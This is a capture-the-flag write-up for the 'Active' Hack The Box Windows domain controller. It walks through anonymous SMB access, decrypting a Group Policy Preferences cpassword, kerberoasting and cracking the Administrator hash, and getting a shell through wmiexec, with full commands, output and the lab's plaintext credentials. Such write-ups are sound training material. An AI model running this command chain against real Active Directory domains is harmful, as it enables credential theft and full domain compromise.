---
title: Active
date: 2026-07-28
description: Easy Windows AD machine with anonymous SMB access — pulling a Group Policy Preferences cpassword from the Replication share, decrypting it for a service account, kerberoasting the Administrator hash, and executing commands through wmiexec.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

```sh
# Nmap 7.98 scan initiated Fri Jul 24 08:07:32 2026 as: /usr/lib/nmap/nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49169 -A -oN scan_results.txt 10.129.34.60
Nmap scan report for active.htb (10.129.34.60)
Host is up (0.56s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-24 12:07:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (98%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (96%), Microsoft Windows Vista Business (96%), Microsoft Windows Vista SP0 or SP1 (96%), Microsoft Windows Vista SP1 (96%), Microsoft Windows Vista SP2 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 (96%), Microsoft Windows Server 2012 or 2012 R2 (96%), Microsoft Windows Server 2008 R2 SP1 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-07-24T12:09:01
|_  start_date: 2026-07-24T11:54:27
|_clock-skew: -1s

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   442.53 ms 10.10.16.1
2   730.19 ms active.htb (10.129.34.60)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 24 08:09:26 2026 -- 1 IP address (1 host up) scanned in 114.51 seconds

```

Anonymous SMB login exposed a readable **Replication** share:

```sh
nxc smb 10.129.34.60 -u '' -p '' --shares

SMB         10.129.34.60    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.34.60    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SMB         10.129.34.60    445    DC               [*] Enumerated shares
SMB         10.129.34.60    445    DC               Share           Permissions     Remark
SMB         10.129.34.60    445    DC               -----           -----------     ------
SMB         10.129.34.60    445    DC               ADMIN$                          Remote Admin
SMB         10.129.34.60    445    DC               C$                              Default share
SMB         10.129.34.60    445    DC               IPC$                            Remote IPC
SMB         10.129.34.60    445    DC               NETLOGON                        Logon server share
SMB         10.129.34.60    445    DC               Replication     READ  
SMB         10.129.34.60    445    DC               SYSVOL                          Logon server share
SMB         10.129.34.60    445    DC               Users           

```

```text
smbclient //10.129.34.60/Replication

> RECUSIVE=ON
> PROMPT=OFF
> mget * 
```

```text
active.htb
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts

22 directories, 7 files

```

**Groups.xml** revealed a username and encrypted password: `active.htb\SVC_TGS : edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

# User

```sh
xmllint -format /root/active/smbshare/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
</User>
</Groups>
```

## GPP decryption

The **Group Policy Preferences** cpassword decrypts with the well-known AES key — **gpp-decrypt**:

```sh
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
```

`active.htb\SVC_TGS : GPPstillStandingStrong2k18`

Re-authenticating with the recovered account opened up the **Users** share:

```sh
nxc smb 10.129.34.60 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.129.34.60    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.34.60    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SMB         10.129.34.60    445    DC               [*] Enumerated shares
SMB         10.129.34.60    445    DC               Share           Permissions     Remark
SMB         10.129.34.60    445    DC               -----           -----------     ------
SMB         10.129.34.60    445    DC               ADMIN$                          Remote Admin
SMB         10.129.34.60    445    DC               C$                              Default share
SMB         10.129.34.60    445    DC               IPC$            READ            Remote IPC
SMB         10.129.34.60    445    DC               NETLOGON        READ            Logon server share
SMB         10.129.34.60    445    DC               Replication     READ  
SMB         10.129.34.60    445    DC               SYSVOL          READ            Logon server share
SMB         10.129.34.60    445    DC               Users           READ

```

Grabbed the user flag:

```sh
smbclient //10.129.35.211/Users -U SVC_TGS%GPPstillStandingStrong2k18
```

# Root

## Kerberoasting

Accounts with a ServicePrincipalName stand out over LDAP:

```sh
ldapsearch -x -H ldap://10.129.35.211 -D 'ACTIVE\SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "CN=Users,DC=active,DC=htb"
```

The Administrator account was the one carrying an SPN.

> Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service.

Roast it with **targetedKerberoast**:

> https://github.com/ShutdownRepo/targetedKerberoast

```sh
python3 targetedkerberost.py -d active.htb -u SVC_TGS -p 'GPPstillStandingStrong2k18'
```

Cracked the Administrator hash against rockyou:

```sh
hashcat -a 0 -m 13100 admin-hash /usr/share/wordlists/rockyou.txt 
```

`Administrator : Ticketmaster1968`

With the Administrator hash cracked, it was a choice between logging in over SMB for the root flag or using wmiexec for a semi-interactive shell over RPC:

```sh
impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.129.35.217 -shell-type powershell
```

`-shell-type` selects the shell flavor — `cmd` or `powershell`.

Gained `root`
